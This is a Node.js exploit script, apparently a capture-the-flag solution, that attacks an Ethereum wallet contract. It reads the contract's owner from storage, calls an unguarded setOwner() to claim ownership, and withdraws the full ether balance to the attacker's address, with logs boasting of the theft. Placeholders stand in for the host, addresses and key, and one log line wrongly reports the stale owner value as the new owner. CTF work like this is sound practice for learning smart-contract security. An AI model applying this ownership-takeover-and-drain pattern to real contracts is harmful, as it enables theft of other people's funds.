// Unfortunately I can not share the source code for the contracts that I used this against but if you go throught the console.logs you can get the gist of what is being done here :)

// Setup:
// mkdir <name>
// cd <name>
// copy file to this directory and change extention back to ".js"
// npm init -y
// npm install ethers 
// npm install web3

// Run:

// node hack.js

const main = async () => {
    var ethers = require('ethers');
    var web3 = require('web3');
    var url = "http://xxxxxx"
    var provider = ethers.providers.getDefaultProvider(url);
    var web3_provider = new web3(url);
    var address  = '0xxxxxx';
    var exfil = ethers.Wallet.createRandom();
    var abi = [{}];
    var wallet_abi = [{}];
    var privateKey = ':)';
    var wallet = new ethers.Wallet(privateKey,provider);
    var setup_contract = new ethers.Contract(address,abi,wallet);
  
    var sendPromise = setup_contract.wallet();
    var wallet_addy = await sendPromise;
    console.log(`We will be attacking ${wallet_addy} Today :)\n`);
  
    var wallet_contract = new ethers.Contract(wallet_addy,wallet_abi,wallet);
  
    var current_owner = await web3_provider.eth.getStorageAt(wallet_contract.address, 0)
    console.log(`The Wallet Contract owner is set to  ${current_owner}. Nothing is private on the blockchain! :)`);
  
    var balance = await provider.getBalance(wallet_contract.address)
    var balanceInEth = ethers.utils.formatEther(balance)
    console.log(`The current balance of ${wallet_addy}: ${balanceInEth} ETH\n`)
  
    var mybalance = await provider.getBalance(wallet.address)
    var mybalanceInEth = ethers.utils.formatEther(mybalance)
    console.log(`My Address is ${wallet.address}`);
    console.log(`The current balance of my address is : ${mybalanceInEth} ETH\n`)
  
    var setOwner = wallet_contract.setOwner();
    var results = await setOwner
    console.log("This is the successful transaction where I set my Address as the owner");
    console.log(results);
    console.log(`As I stated my address is ${wallet.address} and the Wallet Contract owner is now set to  ${current_owner}`);
    console.log("Now I can finally steal all the ether! :)\n")
  
    var takeMoney = wallet_contract.withdraw(wallet.address);
    var please_finally_work = await takeMoney
  
    var balance = await provider.getBalance(wallet_contract.address)
    var latest_balance = ethers.utils.formatEther(balance)
  
    var mybalance = await provider.getBalance(wallet.address)
    var my_latest_balance = ethers.utils.formatEther(mybalance)
  
    console.log("This is the successful transaction where I withdraw all of the ether to my address");
    console.log(please_finally_work);
    console.log(`The attack is complete! The remaining balance of ${wallet_addy} after the attack: ${latest_balance} ETH`)
    console.log(`My new balance is now ${my_latest_balance} ETH :)\n`)
  
    var isSolved = setup_contract.isSolved();
    var done = await isSolved;
    console.log(`This is the successful transaction where the return value returns back ${done} when I call the isSolved() function in the Setup contract! As we can see, the balance of the Wallet contract is now 0 :)`);
  };
  
  main();